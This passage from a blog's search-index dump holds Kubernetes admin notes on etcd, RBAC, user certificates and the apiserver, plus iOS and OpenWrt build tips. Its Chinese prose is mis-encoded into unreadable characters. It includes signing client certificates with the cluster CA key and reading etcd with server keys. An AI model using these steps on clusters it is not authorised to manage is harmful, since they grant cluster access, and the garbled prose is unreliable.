Master | | +-------------------------+ | | +-------&gt;| API Server |&lt;--------+ | | | | | | | | v +-------------------------+ v | | +----------------+ ^ +--------------------+ | | | | | | | | | | Scheduler | | | Controller Manager | | | | | | | | | | +----------------+ v +--------------------+ | | +------------------------------------------------------+ | | | | | | | Cluster state store | | | | | | | +------------------------------------------------------+ | +----------------------------------------------------------+ Controller ManagerController Manager ç”± kube-controller-manager å’Œ cloud-controller-manager ä¸¤éƒ¨åˆ†ç»„æˆï¼Œcloud-controller-manager åˆ™æ˜¯ä¸ºå„å®¶äº‘å‚å•†æä¾›äº†ä¸€ä¸ªæŠ½è±¡çš„å°è£…ï¼Œä¾¿äºè®©å„å‚å•†ä½¿ç”¨å„è‡ªçš„ provideã€‚ kube-controller-managerkube-controller-manager æ˜¯ä¸€ä¸ªåµŒå…¥äº† K8S æ ¸å¿ƒæ§åˆ¶å¾ªç¯çš„å®ˆæŠ¤è¿›ç¨‹æ§åˆ¶å¾ªç¯è¿™é‡Œæ‹†è§£ä¸ºä¸¤éƒ¨åˆ†ï¼š æ§åˆ¶ å’Œ å¾ªç¯ ï¼Œå®ƒæ‰€æ§åˆ¶çš„æ˜¯é›†ç¾¤çš„çŠ¶æ€ï¼›è‡³äºå¾ªç¯å®ƒå½“ç„¶æ˜¯ä¼šæœ‰ä¸ªå¾ªç¯é—´éš”çš„ï¼Œè¿™é‡Œæœ‰ä¸ªå‚æ•°å¯ä»¥è¿›è¡Œæ§åˆ¶kube-controller-manager ä»¥åŠå®ƒåœ¨ K8S ä¸­ä¸»è¦æ˜¯å°†é›†ç¾¤è°ƒèŠ‚è‡³é¢„æœŸçš„çŠ¶æ€ï¼Œå¹¶æä¾›å‡ºäº† /metrics çš„æ¥å£å¯ä¾›ç›‘æ§kube-controller-manager ä¸­æœ‰å¾ˆå¤šçš„ controller å¤§å¤šæ•°æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå½“ç„¶ä¹Ÿæœ‰é»˜è®¤å…³é—­çš„ï¼Œæ¯”å¦‚ bootstrapsigner å’Œ tokencleanerï¼Œåœ¨æˆ‘ä»¬å¯åŠ¨ kube-controller-manager çš„æ—¶å€™ï¼Œå¯é€šè¿‡ --controllers çš„å‚æ•°è¿›è¡Œæ§åˆ¶ï¼Œå°±æ¯”å¦‚ä¸Šé¢ä¾‹å­ä¸­ --controllers=*,bootstrapsigner,tokencleaner è¡¨ç¤ºå¼€å¯æ‰€æœ‰é»˜è®¤å¼€å¯çš„ä»¥åŠ bootstrapsigner å’Œ tokencleaneæŸ¥çœ‹ kube-controller-manager çš„æ—¥å¿—:1kubectl -n kube-system describe pods -l component=kube-controller-manageræŸ¥çœ‹ pod:1kubectl -n kube-system get pod -l component=kube-controller-managerè¿›å…¥ pod æŸ¥çœ‹å…·ä½“ä¿¡æ¯ï¼š123// kube-controller-manager åœ¨ 10252 ç«¯å£ä¸Šä¸ä»…æš´éœ²å‡ºæ¥äº†ä¸€ä¸ª /healthz æ¥å£ï¼Œè¿˜æš´éœ²å‡ºäº†ä¸€ä¸ª /metrics çš„æ¥å£ï¼Œå¯ç”¨äºè¿›è¡Œç›‘æ§ä¹‹ç±»çš„kubectl -n kube-system exec -it kube-controller-manager-kind-control-plane sh wget -qO- http://127.0.0.1:10252/metrics|grep gc_controllerå‚è€ƒèµ„æ–™ï¼šhttps://github.com/kubernetes/client-go/tree/master/informers","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"etcd","slug":"history/tech/5cb82144027cba84434ae7be","date":"2019-04-17T19:03:32.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb82144027cba84434ae7be/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb82144027cba84434ae7be/","excerpt":"","text":"å®˜æ–¹ä¸‹è½½:https://github.com/etcd-io/etcd/releases123456789101112131415161718+----------------------------------------------------------+ | Master | | +-------------------------+ | | +-------&gt;| API Server |&lt;--------+ | | | | | | | | v +-------------------------+ v | | +----------------+ ^ +--------------------+ | | | | | | | | | | Scheduler | | | Controller Manager | | | | | | | | | | +----------------+ v +--------------------+ | | +------------------------------------------------------+ | | | | | | | Cluster state store | | | | | | | +------------------------------------------------------+ | +----------------------------------------------------------+è¿›å…¥ etcd çš„ pod1kubectl -n kube-system exec -it etcd-master shä¼ é€’è¯ä¹¦ç­‰ç›¸å…³å‚æ•°ï¼ŒæŸ¥çœ‹ member:1ETCDCTL_API=3 etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt member listæŸ¥çœ‹å­˜å‚¨çš„å…ƒä¿¡æ¯:1ETCDCTL_API=3 etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt get /registry --prefix --keys-onlyæŸ¥çœ‹ Namespaces ä¿¡æ¯1ETCDCTL_API=3 etcdctl --key=/etc/kubernetes/pki/etcd/server.key --cert=/etc/kubernetes/pki/etcd/server.crt --cacert=/etc/kubernetes/pki/etcd/ca.crt get /registry/namespaces --prefix --keys-onlyå‚è€ƒèµ„æ–™:https://etcd.readthedocs.io/en/latest/faq.html#what-is-etcd","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"k8s åˆ›å»ºç”¨æˆ·","slug":"history/tech/5cb6f8d3027cba84434ae7bc","date":"2019-04-16T21:58:43.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb6f8d3027cba84434ae7bc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb6f8d3027cba84434ae7bc/","excerpt":"","text":"åˆ›å»ºç”¨æˆ·:ç”¨æˆ·åä¸º backend æ‰€å±ç»„ä¸º devåˆ›å»ºæ–°çš„ namespace workï¼š12kubectl create namespace workmkdir work &amp;&amp; cd workåˆ›å»ºç§é’¥:1openssl genrsa -out backend.key 2048ä½¿ç”¨ç§é’¥ç”Ÿæˆè¯ä¹¦è¯·æ±‚:1openssl req -new -key backend.key -out backend.csr -subj &quot;/CN=backend/O=dev&quot;ä½¿ç”¨ CA è¿›è¡Œç­¾åã€‚K8S é»˜è®¤çš„è¯ä¹¦ç›®å½•ä¸º /etc/kubernetes/pki:1openssl x509 -req -in backend.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out backend.crt -days 365æŸ¥çœ‹ç”Ÿæˆçš„è¯ä¹¦æ–‡ä»¶:1openssl x509 -in backend.crt -text -nooutæ·»åŠ  context:12kubectl config set-credentials backend --client-certificate=/root/work/backend.crt --client-key=/root/work/backend.keykubectl config set-context backend-context --cluster=kind --namespace=work --user=backendä½¿ç”¨æ–°ç”¨æˆ·æµ‹è¯•è®¿é—®:123456789101112131415kubectl --context=backend-context get podsroot@testkind:~/work# kubectl --context=backend-context get pods -n work -v 5I0417 09:32:05.711722 20713 helpers.go:196] server response object: [&#123; &quot;kind&quot;: &quot;Status&quot;, &quot;apiVersion&quot;: &quot;v1&quot;, &quot;metadata&quot;: &#123;&#125;, &quot;status&quot;: &quot;Failure&quot;, &quot;message&quot;: &quot;pods is forbidden: User \\&quot;backend\\&quot; cannot list resource \\&quot;pods\\&quot; in API group \\&quot;\\&quot; in the namespace \\&quot;work\\&quot;&quot;, &quot;reason&quot;: &quot;Forbidden&quot;, &quot;details&quot;: &#123; &quot;kind&quot;: &quot;pods&quot; &#125;, &quot;code&quot;: 403&#125;]F0417 09:32:05.711843 20713 helpers.go:114] Error from server (Forbidden): pods is forbidden: User &quot;backend&quot; cannot list resource &quot;pods&quot; in API group &quot;&quot; in the namespace &quot;work&quot;åˆ›å»º Role é…ç½®æ–‡ä»¶:1234567891011cat &lt;&lt;EOF &gt; backend-role.yaml kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata: namespace: work name: backend-rolerules:- apiGroups: [&quot;&quot;] resources: [&quot;pods&quot;] verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]EOFåˆ›å»º Role:1kubectl create -f backend-role.yamlæŸ¥çœ‹:1kubectl get roles -n work -o yamlåˆ›å»ºRolebinding é…ç½®æ–‡ä»¶::123456789101112131415cat &lt;&lt;EOF &gt; backend-rolebind.yamlkind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata: name: backend-rolebinding namespace: worksubjects: - kind: User name: backend apiGroup: &quot;&quot; roleRef: kind: Role name: backend-role apiGroup: &quot;&quot;EOFåˆ›å»º Rolebinding:1kubectl create -f backend-rolebind.yamlæŸ¥çœ‹ Rolebinding:1kubectl get rolebinding -o yaml -n workæµ‹è¯•ç”¨æˆ·æƒé™:123// ç”¨æˆ·å·²ç»å…·å¤‡æŸ¥çœ‹ Pod çš„æƒé™ï¼Œä½†å¹¶ä¸èƒ½æŸ¥çœ‹ Namespace æˆ–è€… deployment ç­‰å…¶ä»–èµ„æºkubectl --context=backend-context get pods -n workkubectl --context=backend-context get nsè°ƒè¯•æƒé™ï¼š123// --as æ˜¯ä¸€ç§å»ºç«‹åœ¨ K8S è®¤è¯æœºåˆ¶ä¹‹ä¸Šçš„æœºåˆ¶ï¼Œå¯ä»¥ä¾¿äºç³»ç»Ÿç®¡ç†å‘˜éªŒè¯æˆæƒæƒ…å†µï¼Œæˆ–è¿›è¡Œè°ƒè¯•ã€‚kubectl auth can-i list pods -n work --as=&quot;backend&quot;kubectl auth can-i list deploy -n work --as=&quot;backend&quot;ä¹Ÿå¯ä»¥ä»¿ç…§ ~/.kube/config æ–‡ä»¶çš„å†…å®¹ï¼Œå°†å½“å‰ç”Ÿæˆçš„è¯ä¹¦åŠç§é’¥æ–‡ä»¶ç­‰å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œé€šè¿‡æŒ‡å®š KUBECONFIG çš„ç¯å¢ƒå˜é‡ï¼Œæˆ–è€…ç»™ kubectl ä¼ é€’ --kubeconfig å‚æ•°æ¥ä½¿ç”¨ç®€åŒ–æ“ä½œï¼škubectx","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kube-apiserver","slug":"history/tech/5cb6dfcc027cba84434ae7bb","date":"2019-04-16T20:11:56.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb6dfcc027cba84434ae7bb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb6dfcc027cba84434ae7bb/","excerpt":"","text":"1234567891011121314151617+----------------------------------------------------------+ | Master | | +-------------------------+ | | +-------&gt;| API Server |&lt;--------+ | | | | | | | | v +-------------------------+ v | | +----------------+ ^ +--------------------+ | | | | | | | | | | Scheduler | | | Controller Manager | | | | | | | | | | +----------------+ v +--------------------+ | | +------------------------------------------------------+ | | | | | | | Cluster state store | | | | | | | +------------------------------------------------------+ | +----------------------------------------------------------+å½“ç„¶ï¼Œè¿™é‡Œè¯´åŸºæœ¬å±•ç¤ºæ˜¯å› ä¸ºæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ kubectl proxy çš„æ–¹å¼ç›´æ¥é€šè¿‡ HTTP è¯·æ±‚è®¿é—® kube-apiserver è€Œæ— éœ€ä»»ä½•è®¤è¯è¿‡ç¨‹ã€‚kube-apiserver ä¸¤ä¸ªå‚æ•°:--insecure-port é»˜è®¤ 8080, é€šè¿‡è¯¥ç«¯å£è®¿é—®æ—¶æ— éœ€è®¤è¯ã€‚ä¸ºäº†é¿å…å®‰å…¨é—®é¢˜ï¼Œä¹Ÿå¯å°†æ­¤å‚æ•°è®¾ç½®ä¸º 0 ä»¥ç¦ç”¨è¯¥åŠŸèƒ½ã€‚è¯¥ç«¯å£ä¼šç»‘å®šåœ¨ --insecure-bind-address å‚æ•°æ‰€è®¾ç½®çš„åœ°å€ä¸Šï¼Œé»˜è®¤ä¸º 127.0.0.1, è¿™ä¸¤ä¸ªéƒ½å·²è¿‡æœŸã€‚ --secure-port çš„å‚æ•°ï¼Œé»˜è®¤ 6443ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"k8s","slug":"k8s","permalink":"https://wangxiuwen.github.io/tags/k8s/"}],"author":"wangxiuwen"},{"title":"ERROR ITMS-90206","slug":"history/tech/5cb5963f027cba84434ae7ba","date":"2019-04-15T20:45:51.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb5963f027cba84434ae7ba/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb5963f027cba84434ae7ba/","excerpt":"","text":"æŠ¥é”™ï¼š12ERROR ITMS-90206: &quot;Invalid Bundle.Thebundleat&apos;Runner.app/PlugIns/jpushServiceExt.appex&apos;containsdisallowedfile&apos;Frameworks&apos;.&quot;è§£å†³:1234* ä¸»å·¥ç¨‹è®¾ç½®build settings&gt;Always Embed Swift Standard Libraries: YES extension&gt;Always Embed Swift Standard Libraries: YES* å­å·¥ç¨‹è®¾ç½®build settings&gt;Always Embed Swift Standard Libraries: YES extension&gt;Always Embed Swift Standard Libraries: NO* PODS å¼•å…¥çš„targetåŒ… è®¾ç½®build settings&gt;Always Embed Swift Standard Libraries: YES extension&gt;Always Embed Swift Standard Libraries: NO","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"openwrt ç¼–è¯‘","slug":"history/tech/5cb56eaf027cba84434ae7b9","date":"2019-04-15T17:57:03.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb56eaf027cba84434ae7b9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb56eaf027cba84434ae7b9/","excerpt":"","text":"clone ä»£ç ï¼š1git clone https://github.com/openwrt/openwrtå‰ç½®ä¾èµ–:123456yum install ncurses-develyum install gawkyum install bzip2yum install perl-develyum -y install perl-Thread-Queueyum -y install patchä¸‹è½½feeds12./scripts/feeds update -a./scripts/feeds install -aå…¶å®ƒéœ€è¦å®‰è£…çš„ä¾èµ–ï¼š12345yum -y install zlib-staticyum -y install openssl-develyum -y install unzipyum -y install wgetyum -y install svnç¼–è¯‘ï¼š12make menuconfigFORCE_UNSAFE_CONFIGURE=1 make -j16 V=s","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"k8s RBAC æƒé™æ§åˆ¶","slug":"history/tech/5cb352810a8b9161717951e7","date":"2019-04-14T03:32:17.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5cb352810a8b9161717951e7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5cb352810a8b9161717951e7/","excerpt":"","text":"123456789101112131415+-----------------------------------------------------------------------------------------------------------+| || +---------------------------------------------------------------------------+ +--------+ || | | | | || +--------+ | +------------------+ +----------------+ +--------------+ +------+ | | | || | | | | | | | | Admission | | | | | | || | Client +------&gt; | Authentication +-&gt; | Authorization +-&gt; | Control +-&gt; |Logic | +--&gt; | Others | || | | | | | | | | | | | | | | || +--------+ | +------------------+ +----------------+ +--------------+ +------+ | | | || | | | | || | | | | || | Kube-apiserver | | | || +---------------------------------------------------------------------------+ +--------+ || |+-----------------------------------------------------------------------------------------------------------+K8S ä¸ºå®ƒæä¾›äº†ä¸‰ç±»å®‰å…¨è®¿é—®çš„æªæ–½ã€‚åˆ†åˆ«æ˜¯ï¼šç”¨äºè¯†åˆ«ç”¨æˆ·èº«ä»½çš„è®¤è¯ï¼ˆAuthenticationï¼‰ï¼Œç”¨äºæ§åˆ¶ç”¨æˆ·å¯¹èµ„æºè®¿é—®çš„æˆæƒï¼ˆAuthorizationï¼‰ç”¨äºèµ„æºç®¡ç†æ–¹é¢çš„å‡†å…¥æ§åˆ¶ï¼ˆAdmission Controlï¼‰K8S ä¸­çš„ç”¨æˆ·123456ä¸€èˆ¬ç”¨æˆ·ï¼š ä¸€èˆ¬ç”¨æˆ·åªèƒ½é€šè¿‡å¤–éƒ¨æœåŠ¡è¿›è¡Œç®¡ç†ï¼Œç”±ç®¡ç†å‘˜è¿›è¡Œç§é’¥åˆ†å‘ã€‚è¿™ä¹Ÿæ„å‘³ç€ K8S ä¸­å¹¶æ²¡æœ‰ä»»ä½•è¡¨ç¤ºä¸€èˆ¬ç”¨æˆ·çš„å¯¹è±¡ï¼Œæ‰€ä»¥ä¸€èˆ¬ç”¨æˆ·æ˜¯æ— æ³•é€šè¿‡ API ç›´æ¥æ·»åŠ åˆ°é›†ç¾¤çš„ã€‚Service Accountï¼š ç”± K8S API ç®¡ç†çš„ç”¨æˆ·ï¼Œä¸ç‰¹å®šçš„ NameSpaceï¼ˆå‘½åç©ºé—´ï¼‰ç»‘å®šã€‚ç”± API Server è‡ªåŠ¨åˆ›å»ºæˆ–è€…é€šè¿‡ API æ‰‹åŠ¨è¿›è¡Œåˆ›å»ºã€‚ åŒæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨æŒ‚è½½åˆ° Pod ä¸­å®¹å™¨çš„ /var/run/secrets/kubernetes.io/serviceaccount/ ç›®å½•ä¸­ï¼Œå…¶ä¸­ä¼šåŒ…å« NameSpace token ç­‰ä¿¡æ¯ï¼Œå¹¶å…è®¸é›†ç¾¤å†…è¿›ç¨‹ä¸ API Server è¿›è¡Œäº¤äº’ã€‚å¯¹é›†ç¾¤æ“ä½œçš„ API éƒ½æ˜¯ä¸ç”¨æˆ·ç›¸å…³è”çš„ï¼Œæˆ–è€…è¢«è§†ä¸ºåŒ¿åè¯·æ±‚ã€‚åŒ¿åè¯·æ±‚å¯é€šè¿‡ kube-apiserver çš„ --anonymous-auth å‚æ•°è¿›è¡Œæ§åˆ¶ï¼Œé»˜è®¤æ˜¯å¼€å¯çš„ï¼ŒåŒ¿åç”¨æˆ·é»˜è®¤çš„ç”¨æˆ·åä¸º system:anonymousï¼Œæ‰€å±ç»„ä¸º system:unauthenticatedã€‚K8S æ”¯æŒä»¥ä¸‹è®¤è¯æœºåˆ¶123456789101112131415161718X509 å®¢æˆ·ç«¯è¯ä¹¦ï¼š æ­å»ºé›†ç¾¤æ—¶ï¼Œè™½ç„¶æ²¡æœ‰æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œä½† kubeadm å·²ç»æ·»åŠ äº†é»˜è®¤å‚æ•° --client-ca-file=/etc/kubernetes/pki/ca.crt è€Œåœ¨è¿›è¡Œè®¤è¯æ—¶ï¼Œå°†ä¼šä½¿ç”¨å®¢æˆ·ç«¯è¯ä¹¦ subject çš„ CN åŸŸï¼ˆCommon Nameï¼‰ç”¨ä½œç”¨æˆ·åï¼ŒO åŸŸï¼ˆOrganizationï¼‰ç”¨ä½œç»„åã€‚å¼•å¯¼ Tokenï¼š å½“é›†ç¾¤é€šè¿‡ kubeadm init åˆå§‹åŒ–å®Œæˆåï¼Œå°†ä¼šå±•ç¤ºä¸€è¡Œæç¤ºï¼Œå…¶ä¸­ä¾¿æºå¸¦ç€å¼•å¯¼ Tokenã€‚ å¦‚æœä¸ä½¿ç”¨ kubeadm æ—¶ï¼Œéœ€è¦è®¾ç½® --enable-bootstrap-token-auth=trueã€‚é™æ€ Token æ–‡ä»¶ï¼š å¯åŠ¨ Kube-apiserver æ—¶ï¼Œè®¾ç½® --token-auth-file=SOMEFILE å¹¶åœ¨è¯·æ±‚æ—¶ï¼ŒåŠ ä¸Š Authorization: Bearer TOKEN çš„è¯·æ±‚å¤´å³å¯ã€‚é™æ€å¯†ç æ–‡ä»¶ï¼š ä¸é™æ€ Token æ–‡ä»¶ç±»ä¼¼ï¼Œè®¾ç½® --basic-auth-file=SOMEFILE å¹¶åœ¨è¯·æ±‚æ—¶ï¼ŒåŠ ä¸Š Authorization: Basic BASE64ENCODED(USER:PASSWORD) çš„å¤´å³å¯ã€‚Service Account Tokenï¼š è¿™æ˜¯é»˜è®¤å¯ç”¨çš„æœºåˆ¶ï¼Œå…³äº Service Account å‰é¢ä¹Ÿå·²ç»ä»‹ç»è¿‡äº†ï¼Œä¸å†èµ˜è¿°ã€‚OpenIDï¼š å…¶å®æ˜¯æä¾›äº† OAuth2 çš„è®¤è¯æ”¯æŒï¼Œåƒ Azure æˆ– Google è¿™ç±»äº‘å‚å•†éƒ½æä¾›äº†ç›¸å…³æ”¯æŒã€‚è®¤è¯ä»£ç†ï¼š ä¸»è¦æ˜¯é…åˆèº«ä»½éªŒè¯ä»£ç†è¿›è¡Œä½¿ç”¨ï¼Œæ¯”å¦‚æä¾›ä¸€ä¸ªé€šç”¨çš„æˆæƒç½‘å…³ä¾›ç”¨æˆ·ä½¿ç”¨ã€‚Webhookï¼š æä¾› Webhook é…åˆä¸€ä¸ªè¿œç«¯æœåŠ¡å™¨ä½¿ç”¨ã€‚å¯é€‰æ‹©åŒæ—¶å¼€å¯å¤šä¸ªè®¤è¯æœºåˆ¶ã€‚ä½¿ç”¨ kubeadm åˆ›å»ºé›†ç¾¤æ—¶ï¼Œé»˜è®¤ä¾¿ä¼šå¼€å¯ X509 å®¢æˆ·ç«¯è¯ä¹¦å’Œå¼•å¯¼ Token ç­‰è®¤è¯æœºåˆ¶K8S æ”¯æŒä»¥ä¸‹æˆæƒæœºåˆ¶ï¼š123456789101112ABAC(Attribute-Based Access Control)ï¼š åŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼Œåœ¨ä½¿ç”¨æ—¶éœ€è¦å…ˆé…ç½® --authorization-mode=ABAC å’Œ --authorization-policy-file=SOME_FILENAME ã€‚ABAC æœ¬èº«è®¾è®¡æ˜¯éå¸¸å¥½çš„ï¼Œä½†æ˜¯åœ¨ K8S ä¸­ä½¿ç”¨å´æœ‰ç‚¹è¿‡äºç¹çï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚RBAC(Role-based access control)ï¼š åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼Œè‡ª K8S 1.6 å¼€å§‹ betaï¼Œ1.8 è¿›å…¥ç¨³å®šç‰ˆï¼Œå·²è¢«å¤§é‡ä½¿ç”¨ã€‚è€Œå½“æˆ‘ä»¬ä½¿ç”¨ kubeadm å®‰è£…é›†ç¾¤çš„æ—¶å€™ï¼Œé»˜è®¤å°†ä¼šæ·»åŠ  --authorization-mode=Node,RBAC çš„å‚æ•°ï¼Œè¡¨ç¤ºåŒæ—¶å¼€å¯ Node å’Œ RBAC æˆæƒæœºåˆ¶ã€‚å½“ç„¶ï¼Œå¦‚æœä½ å¯¹ MongoDB æœ‰æ‰€äº†è§£æˆ–è€…æ¯”è¾ƒç†Ÿæ‚‰çš„è¯ï¼Œè¿™éƒ¨åˆ†çš„å†…å®¹å°±ä¼šå¾ˆå®¹æ˜“ç†è§£ï¼Œå› ä¸º MongoDB çš„æƒé™æ§åˆ¶ä¹Ÿä½¿ç”¨äº† RBAC ï¼ˆRole-based access controlï¼‰ã€‚Nodeï¼š è¿™æ˜¯ä¸€ç§ç‰¹æ®Šç”¨é€”çš„æˆæƒæœºåˆ¶ï¼Œä¸“é—¨ç”¨äºå¯¹ kubelet å‘å‡ºçš„ API è¯·æ±‚åšæˆæƒéªŒè¯ã€‚Webhookï¼š ä½¿ç”¨å¤–éƒ¨çš„ Server é€šè¿‡ API è¿›è¡Œæˆæƒæ ¡éªŒï¼Œéœ€è¦åœ¨å¯åŠ¨æ—¶å€™å¢åŠ  --authorization-webhook-config-file=SOME_FILENAME ä»¥åŠ --authorization-mode=WebhookAlwaysAllowï¼š é»˜è®¤é…ç½®ï¼Œå…è®¸å…¨éƒ¨ã€‚AlwaysDenyï¼š é€šå¸¸ç”¨äºæµ‹è¯•ï¼Œç¦æ­¢å…¨éƒ¨ã€‚k8s ä¸­çš„ Role:1234Roleï¼š å¯ä»¥å½“ä½œæ˜¯ä¸€ç»„æƒé™çš„é›†åˆï¼Œä½†è¢«é™åˆ¶åœ¨æŸä¸ª Namespace å†…ï¼ˆK8S çš„ Namespaceï¼‰ã€‚ClusterRoleï¼š å¯¹äºé›†ç¾¤çº§åˆ«çš„èµ„æºæ˜¯ä¸è¢« Namespace æ‰€é™åˆ¶çš„ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€äº›éèµ„æºç±»çš„è¯·æ±‚ï¼Œæ‰€ä»¥ä¾¿äº§ç”Ÿäº†å®ƒã€‚åœ¨ K8S ä¸­ç”¨æˆ·æˆæƒç§°ä¹‹ä¸º bindingï¼Œå³ rolebinding å’Œ clusterrolebindingæŸ¥çœ‹Role:12345kubectl get roles --all-namespaces=truekubectl get rolebindings --all-namespaces=truekubectl get clusterroleskubectl get clusterrolebindingsæŸ¥çœ‹ç”¨æˆ·æƒé™:123# kubectl config current-context # è·å–å½“å‰ä¸Šä¸‹æ–‡, åä¸º kubernetes-admin çš„ç”¨æˆ·ï¼Œåœ¨åä¸º kind çš„ cluster ä¸Š kubernetes-admin@kind# kubectl config view -o yaml # æŸ¥çœ‹ user é…ç½®ï¼Œä»¥ä¸‹çœç•¥äº†éƒ¨åˆ†å†…å®¹client-certificate-data çš„éƒ¨åˆ†é»˜è®¤æ˜¯ä¸æ˜¾ç¤ºçš„ï¼Œè€Œå®ƒçš„å†…å®¹å®é™…æ˜¯é€šè¿‡ base64 åŠ å¯†åçš„è¯ä¹¦å†…å®¹ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡ŒæŸ¥çœ‹12kubectl config view --raw -o jsonpath=&apos;&#123; .users[?(@.name == &quot;kubernetes-admin&quot;)].user.client-certificate-data&#125;&apos; |base64 -d kubectl config view --raw -o jsonpath=&apos;&#123; .users[?(@.name == &quot;kubernetes-admin&quot;)].user.client-certificate-data&#125;&apos; |base64 -d |openssl x509 -text -noout //å½“å‰çš„ç”¨æˆ·æ˜¯ kubernetes-admin ï¼ˆCN åŸŸï¼‰ï¼Œæ‰€å±ç»„æ˜¯ system:masters ï¼ˆO åŸŸï¼‰clusterrolebindings ä¸­çš„ cluster-admin:1kubectl get clusterrolebindings cluster-admin -o yamlé‡ç‚¹å†…å®¹åœ¨ roleRef å’Œ subjects ä¸­ï¼Œåä¸º cluster-admin çš„ ClusterRole ä¸åä¸º system:masters çš„ Group ç›¸ç»‘å®šClusterRole çš„å®é™…å†…å®¹:1kubectl get clusterrole cluster-admin -o yamlrules ä¸­å®šä¹‰äº†å®ƒæ‰€èƒ½æ“ä½œçš„èµ„æºåŠå¯¹åº”åŠ¨ä½œï¼Œ* æ˜¯é€šé…ç¬¦ã€‚å½“å‰ç”¨æˆ· kubernetes-admin å±äº system:masters ç»„ï¼Œè€Œè¿™ä¸ªç»„ä¸ cluster-admin è¿™ä¸ª ClusterRole æ‰€ç»‘å®šï¼Œæ‰€ä»¥ç”¨æˆ·ä¹Ÿå°±ç»§æ‰¿äº†å…¶æƒé™ã€‚å…·å¤‡äº†å¯¹å¤šç§èµ„æºå’Œ API çš„ç›¸å…³æ“ä½œæƒé™ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"athens 